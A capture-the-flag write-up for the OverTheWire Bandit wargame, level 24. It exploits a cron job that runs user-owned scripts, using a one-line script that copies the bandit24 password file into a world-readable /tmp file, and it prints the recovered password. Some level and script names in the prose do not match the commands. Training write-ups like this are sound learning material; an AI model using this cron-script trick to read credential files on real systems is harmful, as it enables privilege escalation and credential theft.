# Bandit24

## Level Description
A program is running automatically at regular intervals from `cron`, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.

## Method of Solving
We log into the `bandit22` server, we list the contents of the home directory:
```bash
bandit23@bandit:~$ ls -la
total 20
drwxr-xr-x   2 root root 4096 Oct 14 09:25 .
drwxr-xr-x 150 root root 4096 Oct 14 09:29 ..
-rw-r--r--   1 root root  220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root root 3851 Oct 14 09:19 .bashrc
-rw-r--r--   1 root root  807 Mar 31  2024 .profile
```
The level description whispered of `cron job` running automatically. We investigate the `/etc/cron.d/` directory, where cron configurations are stored. We navigated there:
```bash
bandit23@bandit:~$ cd /etc/cron.d/
bandit23@bandit:/etc/cron.d$ ls
behemoth4_cleanup  cronjob_bandit23  leviathan5_cleanup    sysstat
clean_tmp          cronjob_bandit24  manpage3_resetpw_job
cronjob_bandit22   e2scrub_all       otw-tmp-dir
```

We open the `cronjob_bandit24` file to see what it was up to:
```bash
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
We inspect the script `/usr/bin/cronjob_bandit23.sh` to understand its purpose:
```bash
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
shopt -s nullglob
myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```
Here's what it did:
- It determined the current user (`whoami`)
- It navigated to `/var/spool/$myname/foo`.
- It executed and deleted all scripts in that directory, but only if the owner was `bandit23`.

We need to create a script in the specified directory. It will be executed as the `bandit24` user:
```bash
bandit23@bandit:~$ echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass.txt; chmod 777 /tmp/bandit24_pass.txt' > /var/spool/bandit24/foo/bandit24.sh; chmod +x /var/spool/bandit24/foo/bandit24.sh
```
This command creates a script in the directory `/var/spool/bandit24/foo` that it will be automatically executed. When the script runs, it will:
- Copy the `bandit24` password to a temporary file `/tmp/bandit24_pass.txt`.
- Allow anyone to read that file (permissions 777).

Then we read the file for the password:
```bash
bandit23@bandit:~$ cat /tmp/bandit24_pass.txt
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```
## Key command

***You are welcome!***
